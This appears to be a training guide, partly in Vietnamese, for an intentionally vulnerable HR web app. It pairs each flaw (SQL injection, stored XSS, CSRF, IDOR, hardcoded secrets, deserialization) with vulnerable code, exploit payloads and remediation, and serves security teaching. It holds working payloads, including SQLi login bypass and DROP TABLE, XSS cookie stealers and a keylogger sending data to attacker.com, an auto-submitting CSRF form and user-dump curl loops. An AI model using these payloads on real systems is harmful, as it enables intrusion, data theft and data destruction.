# 🛡️ NexusHR SaaS - Vulnerabilities Guide

## 📋 Overview

This document details all intentional vulnerabilities in the NexusHR Enterprise SaaS application for educational, pentesting, and compliance testing purposes.

---

## ⚠️ VULNERABILITY 1: SQL INJECTION

**File:** `app/Controllers/LoginController.php`  
**Severity:** CRITICAL  
**CVSS Score:** 9.8  
**CWE:** CWE-89

### Description
The login endpoint directly concatenates user input into SQL queries without parameterization.

### Vulnerable Code
```php
$query = "SELECT * FROM users WHERE username = '$username' AND password = '$password'";
$user = DB::select(DB::raw($query));
```

### Exploitation Methods

#### 1. Authentication Bypass
```
POST /login
username: admin' OR '1'='1' --
password: anything
```
*Note: In the NexusHR UI, the `username` field is labeled as "Corporate Employee ID" and `password` as "Secure Password".*

**Result:** Logs in as first user without knowing password

#### 2. Data Exfiltration via UNION
```
POST /login
username: admin' UNION SELECT user(),database(),version() --
password: anything
```

#### 3. Blind SQLi with Time Delay
```
POST /login
username: admin' AND SLEEP(5) --
password: anything
```

#### 4. Multi-statement SQL Injection (if supported)
```
POST /login
username: admin'; DROP TABLE users; --
password: anything
```

**IMPACT:** Complete database compromise, data theft, data destruction

### Testing Tools
- SQLMap: `sqlmap -r login_request.txt --dbs`
- Burp Suite: Burp Intruder + SQLi payload lists
- OWASP ZAP: Active scan with SQL Injection detection

### Remediation
```php
// Safe alternative using parameterized queries
$user = DB::table('users')
    ->where('username', $request->input('username'))
    ->where('password', $request->input('password'))
    ->first();
```

---

## ⚠️ VULNERABILITY 2: CROSS-SITE SCRIPTING (XSS) - STORED

**File:** `app/Controllers/PostController.php`  
**Severity:** HIGH  
**CVSS Score:** 7.5  
**CWE:** CWE-79

### Description
User-supplied content (such as Employee Feedback on the Corporate Announcements page) is stored in the database and rendered without sanitization or escaping.

### Vulnerable Code
```php
// Store unsanitized input
$post->content = $request->input('content');  // No sanitization
$post->save();

// Render without escaping
return view('posts.show', ['content' => $post->content]);
```

### Exploitation Methods

#### 1. Cookie Stealer
```html
<script>
fetch('https://attacker.com/steal?cookie=' + document.cookie)
</script>
```

#### 2. Session Hijacking
```html
<script>
new Image().src = 'http://attacker.com/log?session=' + 
    encodeURIComponent(document.cookie);
</script>
```

#### 3. Keylogger
```html
<script>
document.onkeypress = function(e) {
    fetch('http://attacker.com/keys?char=' + e.key);
}
</script>
```

#### 4. Redirect to Phishing
```html
<script>
window.location = 'http://attacker.com/phishing';
</script>
```

#### 5. DOM Manipulation
```html
<img src=x onerror="document.body.innerHTML='<h1>Hacked!</h1>'">
```

### Testing Payloads
```
<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>
<body onload=alert('XSS')>
"><script>alert('XSS')</script>
```

### Remediation
```php
// 1. Use Blade automatic escaping
{{ $content }}  // Automatically escaped

// 2. Explicit escaping
{!! e($content) !!}

// 3. Input sanitization
$content = strip_tags($request->input('content'));

// 4. Content Security Policy (CSP) header
header('Content-Security-Policy: default-src \'self\'');
```

---

## ⚠️ VULNERABILITY 3: CROSS-SITE REQUEST FORGERY (CSRF)

**File:** `app/Controllers/PostController.php`  
**Severity:** MEDIUM  
**CVSS Score:** 6.5  
**CWE:** CWE-352

### Description
POST requests lack CSRF token validation, allowing attackers to forge requests on behalf of users.

### Vulnerable Code
```php
public function store(Request $request)
{
    // No CSRF token verification
    $post = new Post();
    $post->content = $request->input('content');
    $post->save();
}
```

### Exploitation Methods

#### 1. Malicious Form on External Site
```html
<!-- File: bay_chuot_csrf.html (nằm trong folder public/) -->
<form id="csrf_form" action="http://localhost:8000/posts" method="POST" style="display: none;">
    <input type="hidden" name="content" value="Sếp là một tên ngốc! Tôi muốn nghỉ việc ngay hôm nay!!!">
</form>
<script>
document.getElementById("csrf_form").submit();  // Auto-submit khi nạn nhân mở trang
</script>
```

### Tested Exploitation Steps (Đã kiểm chứng thành công)

#### ✅ Demo CSRF Attack (Cổng 8000 - Không có WAF)
```
1. Sửa bay_chuot_csrf.html → action="http://localhost:8000/posts"
2. Copy vào Docker:
   docker cp C:\Users\ACER\Downloads\files\web-app-security-law86\1_vulnerable-webapp\public\bay_chuot_csrf.html vulnerable-webapp:/var/www/html/public/bay_chuot_csrf.html
3. Đăng nhập john trên http://localhost:8000/login (john / john123)
4. Mở tab mới → gõ http://localhost:8000/bay_chuot_csrf.html
5. Form tự động POST → Bài viết chửi sếp xuất hiện dưới tên John!
```

#### 🛡️ Demo WAF chặn CSRF (Cổng 80 - Có WAF)
```
1. Sửa bay_chuot_csrf.html → action="http://localhost/posts"
2. Copy vào Docker
3. Đăng nhập john trên http://localhost/login (john / john123)
4. Mở tab mới → gõ http://localhost:8000/bay_chuot_csrf.html
5. WAF Rule 9004 kiểm tra Referer = "http://localhost:8000/..." ≠ "http://localhost/"
6. Kết quả: 🛑 403 FORBIDDEN! Bài viết KHÔNG được đăng.
```

#### ⚠️ Lưu ý quan trọng khi test CSRF
```
❌ KHÔNG click đúp file từ File Explorer (file:///)
   → Chrome SameSite Cookie policy chặn, không gửi session cookie → Văng ra login

✅ PHẢI mở qua URL: http://localhost:8000/bay_chuot_csrf.html
   → Cookie localhost được gửi kèm → Attack hoạt động đúng
```

### Impact
- Unauthorized posts creation
- User profile modification
- Password changes
- Financial transactions

### Remediation
```php
// Laravel includes CSRF protection by default
// In Blade template:
<form method="POST">
    @csrf  <!-- Laravel automatically includes CSRF token -->
    <input type="text" name="content">
</form>

// Or manually:
<input type="hidden" name="_token" value="{{ csrf_token() }}">
```

---

## ⚠️ VULNERABILITY 4: INSECURE DIRECT OBJECT REFERENCES (IDOR)

**File:** `app/Controllers/ProfileController.php`  
**Severity:** HIGH  
**CVSS Score:** 7.3  
**CWE:** CWE-639

### Description
Access control checks missing, allowing users to access/modify other employees' sensitive data (like Payroll, SSN, Salary) by changing object reference (e.g., from `/profile/2` to `/profile/1`).

### Vulnerable Code
```php
public function show($userId)
{
    // No ownership verification
    $user = User::find($userId);  // Returns any user
    return view('profile.show', ['user' => $user]);
}

public function update(Request $request, $userId)
{
    // No authorization check
    $user = User::find($userId);
    $user->email = $request->input('email');
    $user->save();  // Can modify any user
}
```

### Exploitation Methods

#### 1. Sequential ID Enumeration
```
GET /profile/1       → User 1 data
GET /profile/2       → User 2 data
GET /profile/3       → User 3 data
GET /profile/999     → Admin data!
```

#### 2. Modify Other Users
```
POST /profile/999/update
email=admin@attacker.com
password=NewAdmin123
role=admin
```

#### 3. Delete Other Users
```
DELETE /profile/2
→ User 2 account deleted
```

#### 4. Mass Data Extraction
```bash
# Bash loop to dump all users
for i in {1..1000}; do
    curl http://vulnerable-app.com/profile/$i
done
```

### Testing Commands
```bash
# Using curl
curl http://localhost:8000/profile/2 -H "Cookie: PHPSESSID=your_session"

# Burp Suite
# Send request, change ID parameter in different ways:
# - /profile/1 → /profile/2
# - /profile/user-1 → /profile/user-2
# - /profile/admin → /profile/user123
```

### Impact
- Unauthorized data access (PII, SSN, credit cards)
- Privilege escalation
- Account takeover
- Data manipulation

### Remediation
```php
// Check ownership before access
public function show($userId)
{
    $user = User::find($userId);
    
    // Verify current user owns this profile
    if (auth()->user()->id !== $user->id) {
        abort(403, 'Unauthorized');
    }
    
    return view('profile.show', ['user' => $user]);
}

// Or use Laravel policies
public function show(User $user)
{
    $this->authorize('view', $user);
    return view('profile.show', ['user' => $user]);
}
```

---

## ⚠️ VULNERABILITY 5: HARDCODED SECRETS & SENSITIVE DATA IN CODE

**File:** `config/database-vulnerable.php`  
**Severity:** CRITICAL  
**CVSS Score:** 9.1  
**CWE:** CWE-798, CWE-542

### Description
Sensitive credentials hardcoded in source files, exposing API keys, database passwords, encryption keys.

### Vulnerable Information
```
DATABASE CREDENTIALS
- Host: mysql.company.com
- Username: root
- Password: RootPass123!SecureDB

API KEYS
- Stripe Secret: sk_live_51234567890abcdef...
- PayPal Secret: EIZ5J1Z5DhX-vZZZ...
- AWS Access Key: AKIAIOSFODNN7EXAMPLE
- AWS Secret: wJalrXUtnFEMI/K7MDENG...

ENCRYPTION KEYS
- App Key: base64:abcdefghijklmnop...
- Database Key: DBEncrypt987654321...

OAUTH/JWT
- JWT Secret: eyJhbGciOiJIUzI1NiI...
- OAuth Secret: oauth_secret_abc...
```

### Exposure Vectors
1. **GitHub Exposure** - Code pushed to public repo
2. **Build Logs** - CI/CD logs containing output
3. **Memory Dumps** - Production server memory dumps
4. **Backups** - Unencrypted backup files
5. **Compiled Code** - Decompiled binaries reveal secrets
6. **Error Messages** - Debug pages showing configuration
7. **Source Control History** - Git history (.git folder)

### Exploitation
```bash
# Find hardcoded secrets with grep
grep -r "password\|secret\|key\|token" app/

# Using git history
git log -p | grep -i "password\|secret"

# Scan with tools
truffleHog https://github.com/company/repo.git
detect-secrets scan --baseline .secrets.baseline
```

### Impact
- Database compromise
- Payment processor account takeover
- Cloud infrastructure access
- Encryption key exposure (data decryption)
- Third-party service account compromise

### Remediation
```php
// Use environment variables
'database' => [
    'password' => env('DB_PASSWORD'),
],

'api_keys' => [
    'stripe_secret' => env('STRIPE_SECRET_KEY'),
],
```

```bash
# .env file (never commit)
DB_PASSWORD=RootPass123!SecureDB
STRIPE_SECRET_KEY=sk_live_51234567...

# .gitignore
.env
.env.backup
*.key
secrets/
```

**Tools for Secrets Management:**
- AWS Secrets Manager
- HashiCorp Vault
- Azure Key Vault
- Google Cloud Secret Manager

---

## ⚠️ VULNERABILITY 6: INSECURE DESERIALIZATION (Bonus)

**Potential Location:** File upload handler  
**Severity:** CRITICAL  
**CVSS Score:** 9.8  
**CWE:** CWE-502

### Description
If application unserializes untrusted data (PHP `unserialize()`), attackers can execute arbitrary code.

### Example Vulnerable Code
```php
public function importUserData($file)
{
    $data = unserialize(file_get_contents($file));  // ❌ VULNERABLE
    return $data;
}
```

### Exploitation
```php
// Create malicious payload
$payload = 'O:8:"stdClass":1:{s:4:"name";s:20:"<script>...</script>";}';
file_put_contents('exploit.ser', $payload);

// Upload to vulnerable app
// App calls unserialize() → RCE
```

### Remediation
```php
// Use JSON instead
$data = json_decode(file_get_contents($file), true);

// Or validate before unserialize
if (!preg_match('/^[a-zA-Z0-9:_]+$/', $data)) {
    throw new Exception('Invalid data');
}
```

---

## 📊 VULNERABILITY SUMMARY TABLE

| # | Name | Severity | CWE | Type | OWASP |
|---|------|----------|-----|------|-------|
| 1 | SQL Injection | CRITICAL | 89 | Injection | A03:2021 |
| 2 | XSS - Stored | HIGH | 79 | Injection | A03:2021 |
| 3 | CSRF | MEDIUM | 352 | CSRF | A04:2021 |
| 4 | IDOR | HIGH | 639 | Access Control | A01:2021 |
| 5 | Hardcoded Secrets | CRITICAL | 798 | Config | A02:2021 |
| 6 | Insecure Deser. | CRITICAL | 502 | Injection | A08:2021 |

---

## 🧪 Testing Methodology

### Tools Required
- Burp Suite Community
- OWASP ZAP
- Postman
- SQLMap
- curl/wget

### Step-by-step Testing

#### 1. Reconnaissance
```bash
curl -v http://localhost:8000
# Identify endpoints, parameters, cookies
```

#### 2. Vulnerability Scanning
```bash
# SonarQube
sonar-scanner -Dsonar.projectKey=vulnerable-web-app

# OWASP ZAP
zaproxy -cmd -quickurl http://localhost:8000 -quickout report.html
```

#### 3. Manual Testing
- Test each vulnerability with provided payloads
- Document findings
- Screenshot evidence
- Note request/response

#### 4. Report Generation
- Create test cases document
- Note exploitability
- Estimate impact
- Recommend fixes

---

## 📚 Learning Resources

- OWASP Top 10: https://owasp.org/www-project-top-ten/
- PortSwigger Web Security Academy: https://portswigger.net/web-security
- HackTheBox: https://www.hackthebox.com/
- DVWA (Damn Vulnerable Web App): http://www.dvwa.co.uk/
- JUICE Shop (OWASP): https://juice-shop.herokuapp.com/

---

**Last Updated:** 2024  
**Project:** Web Application Security - Law 86/2025 Compliance
